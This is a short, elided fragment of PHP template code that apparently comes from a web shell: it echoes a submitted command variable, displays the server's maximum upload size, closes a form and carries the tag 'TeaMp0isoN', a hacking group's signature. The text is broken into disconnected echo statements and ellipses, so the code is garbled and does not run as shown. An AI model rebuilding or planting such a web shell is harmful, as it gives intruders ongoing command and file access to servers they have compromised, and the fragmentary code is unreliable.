...
?><?php echo $dispd; ?><?php echo htmlspecialchars($cmd); ?><?php echo $dispd; ?><?php
    ...
    ?><?php echo $wdt." Max size: ". @ini_get("upload_max_filesize")."B"; ?><?php ##[ TeaMp0isoN ]## ?><?php
  ...
  echo "</form>\r\n";
?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $wdt; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php echo $dispd; ?><?php footer(); ?><?php
